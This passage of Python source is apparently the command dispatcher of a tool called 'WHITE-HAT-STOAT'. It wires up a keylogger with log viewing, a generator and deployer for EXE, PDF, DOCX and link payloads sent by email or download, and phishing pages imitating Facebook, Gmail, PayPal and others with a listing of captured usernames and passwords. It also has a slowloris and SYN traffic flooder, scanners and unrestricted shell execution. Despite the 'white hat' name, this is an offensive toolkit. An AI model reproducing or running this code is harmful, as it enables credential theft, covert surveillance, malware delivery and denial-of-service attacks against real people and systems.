                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Keylogger Commands ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger module not initialized'}
        self.keylogger.start_keylogger()
        return {'success': True, 'output': '⌨️ Keylogger started. Press F10 to stop.'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger module not initialized'}
        self.keylogger.stop_keylogger()
        return {'success': True, 'output': '🛑 Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger module not initialized'}
        status = 'Running' if self.keylogger.running else 'Stopped'
        return {'success': True, 'output': f"⌨️ Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger module not initialized'}
        limit = 50
        if args and args[0].isdigit():
            limit = int(args[0])
        logs = self.keylogger.get_logs(limit)
        if not logs:
            return {'success': True, 'output': '📭 No keylogger logs found'}
        output = "📋 Keylogger Logs:\n" + "=" * 50 + "\n"
        for log in logs[:limit]:
            output += f"[{log['timestamp'][:19]}] {log['hostname']}: {log['text'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Payload Commands ====================
    def _payload_gen(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_gen <type> <name> [target_ip] [target_port]\nTypes: exe, pdf, docx, link, network'}
        
        payload_type = args[0]
        name = args[1]
        
        if payload_type == 'exe':
            payload = self.payload_gen.generate_exe(name)
        elif payload_type == 'pdf':
            payload = self.payload_gen.generate_pdf(name)
        elif payload_type == 'docx':
            payload = self.payload_gen.generate_docx(name)
        elif payload_type == 'link':
            payload = self.payload_gen.generate_link(name)
        elif payload_type == 'network':
            target_ip = args[2] if len(args) > 2 else '127.0.0.1'
            target_port = int(args[3]) if len(args) > 3 else 80
            payload = self.payload_gen.generate_network_payload(name, target_ip, target_port)
        else:
            return {'success': False, 'output': f'Unknown payload type: {payload_type}'}
        
        return {'success': True, 'output': f"💀 Payload generated: {payload.id} ({payload.payload_type}) at {payload.file_path}"}
    
    def _payload_list(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        payload_type = args[0] if args else None
        payloads = self.payload_gen.list_payloads(payload_type)
        if payloads:
            output = "💀 Payloads:\n" + "=" * 50 + "\n"
            for p in payloads:
                output += f"  • {p['id']} - {p['name']} ({p['payload_type']}) - {p['deployment_count']} deployments\n"
            return {'success': True, 'output': output}
        return {'success': True, 'output': 'No payloads found'}
    
    def _payload_deploy(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: payload_deploy <payload_id> <type> <target>\nTypes: email, link, download, network'}
        
        payload_id = args[0]
        deploy_type = args[1]
        target = args[2]
        
        result = self.payload_gen.deploy_payload(payload_id, deploy_type, target)
        return {'success': result.get('success', False), 'output': result.get('message', result.get('error', ''))}
    
    def _payload_exe(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_exe(name)
        return {'success': True, 'output': f"💀 EXE payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_pdf(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_pdf(name)
        return {'success': True, 'output': f"💀 PDF payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_docx(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_docx(name)
        return {'success': True, 'output': f"💀 DOCX payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_link(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_link(name)
        return {'success': True, 'output': f"💀 Link payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_network(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if len(args) > 0 else f"payload_{int(time.time())}"
        target_ip = args[1] if len(args) > 1 else '127.0.0.1'
        target_port = int(args[2]) if len(args) > 2 else 80
        payload = self.payload_gen.generate_network_payload(name, target_ip, target_port)
        return {'success': True, 'output': f"💀 Network payload generated: {payload.id} at {payload.file_path}"}
    
    # ==================== Ping Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        target = args[0]
        result = self._generic(f'ping6 -c 4 {target}')
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self.tools.nmap(network, 'quick')
        return {'success': result.success, 'output': result.output}
    
    # ==================== Nmap Commands ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [scan_type]'}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else 'quick'
        result = self.tools.nmap(target, scan_type)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_snmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_snmp <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'snmp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_smb(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_smb <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'smb')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ssh(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ssh <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'ssh')
        return {'success': result.success, 'output': result.output}
    
    # ==================== Curl Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"🔌 SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "🔌 SSH Connections:\n" + "=" * 50 + "\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"🔌 Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"🔌 Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]\nTypes: icmp, tcp_syn, tcp_ack, tcp_fin, tcp_rst, udp, http_get, http_post, https, dns, arp, slowloris, mixed, random'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "📡 Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': '🛑 Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "🚀 Active Traffic Generators:\n" + "=" * 50 + "\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== Nikto Commands ====================
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_full(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '123456789', 'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"🕷️ Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_ssl(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"🔒 SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # ==================== Social Engineering ====================
    def _phish(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish <platform>\nPlatforms: facebook, instagram, twitter, gmail, linkedin, github, microsoft, apple, amazon, paypal, custom'}
        platform = args[0]
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': '🎣 Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': '📭 No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n" + "=" * 50 + "\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args: List[str]) -> Dict:
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': '📭 No phishing links'}
        output = "🎣 Phishing Links:\n" + "=" * 50 + "\n"
        for l in links:
            output += f"  • {l['id']} - {l['platform']} ({l['clicks']} clicks)\n"
        return {'success': True, 'output': output}
    
    # ==================== Network Commands ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = self.tools.whois(domain)
        return {'success': result.success, 'output': result.output}
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = self.tools.location(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n" + "=" * 50 + "\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            output += f"  {status} {ip['ip_address']} - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            
            output = f"🔍 IP Information: {ip}\n" + "=" * 40 + "\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        
        output = f"🦡 WHITE-HAT-STOAT IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🦡 WHITE-HAT-STOAT System Status
{'='*50}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Payloads Generated: {stats.get('total_payloads', 0)}
  Total Keylogs: {stats.get('total_keylogs', 0)}
  Total Scans: {stats.get('total_scans', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "=" * 50 + "\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*50}

OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n" + "=" * 50 + "\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        payloads = self.db.get_payloads()
        keylogs = self.db.get_keylogs(10)
        
        report = f"""
🦡 WHITE-HAT-STOAT Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Payloads Generated: {stats.get('total_payloads', 0)}
  Total Keylogs: {stats.get('total_keylogs', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        report += f"\n💀 Payloads Generated: {len(payloads)}\n"
        if payloads:
            for p in payloads[:5]:
                report += f"  • {p['name']} ({p['payload_type']}) - {p['deployment_count']} deployments\n"
        
        report += f"\n⌨️ Recent Keylogs: {len(keylogs)}\n"
        if keylogs:
            for k in keylogs[:5]:
                report += f"  • {k['timestamp'][:19]} - {k['hostname']}: {k['text'][:50]}...\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🦡 WHITE-HAT-STOAT v1.0.0 - HELP MENU                              {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GRAY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING & SCAN COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  nmap <target> [scan_type]     - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan (all ports)
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║  nmap_snmp <target>            - SNMP scan
║  nmap_smb <target>             - SMB scan
║  nmap_ssh <target>             - SSH scan
║
║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <dur> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║
║{Colors.SUCCESS}⌨️ KEYLOGGER COMMANDS:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Show keylogger status
║  keylogger_logs [limit]        - Show keylogger logs
║
║{Colors.SUCCESS}💀 PAYLOAD COMMANDS:{Colors.RESET}
║  payload_gen <type> <name>     - Generate payload (exe/pdf/docx/link/network)
║  payload_list [type]           - List payloads
║  payload_deploy <id> <type> <target> - Deploy payload
║  payload_exe <name>            - Generate EXE payload
║  payload_pdf <name>            - Generate PDF payload
║  payload_docx <name>           - Generate DOCX payload
║  payload_link <name>           - Generate Link payload
║  payload_network <name> <ip> <port> - Generate Network payload
║
